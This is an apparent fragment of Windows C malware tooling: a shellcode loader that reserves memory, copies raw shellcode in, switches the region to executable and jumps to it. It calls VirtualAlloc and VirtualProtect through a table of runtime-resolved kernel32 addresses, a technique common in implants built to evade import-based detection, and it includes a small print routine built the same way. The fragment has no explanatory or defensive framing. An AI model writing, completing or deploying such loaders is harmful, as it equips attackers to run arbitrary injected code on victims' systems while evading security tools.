void *shellcode_handling_load(char *shellcode_to_load, int shellcode_to_load_size){
    // Reserve memory, copy contents and change protections
    void *reserved_memory = (void *) ((LPVOID (*)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[VIRTUAL_ALLOC_INDEX])(NULL,(SIZE_T) shellcode_to_load_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    replacement_memcpy(reserved_memory, shellcode_to_load, shellcode_to_load_size);
    DWORD oldProtect;
    (((BOOL (*)(LPVOID, DWORD, DWORD, DWORD*)) kernel_library_function_addresses[VIRTUAL_PROTECT_INDEX]) ((LPVOID) reserved_memory, (DWORD) shellcode_to_load_size, PAGE_EXECUTE_READ, &oldProtect));
    return reserved_memory;    
}

void shellcode_handling_execute(void *shellcode_address){
    void (*execute_entry_point)(void) = (void(*)()) shellcode_address;
    execute_entry_point();
}

// MAIN
void print_minimal(void) {
    const char *msg = "Hello from minimal printf";
    
    // Assuming GetStdHandle and WriteFile are in kernel_library_function_addresses
    HANDLE stdout_handle = ((HANDLE (*)(DWORD)) kernel_library_function_addresses[9])(-11);
    DWORD written;
    ((BOOL (*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) kernel_library_function_addresses[8])(stdout_handle, (void*)msg, 26, &written, NULL);
}

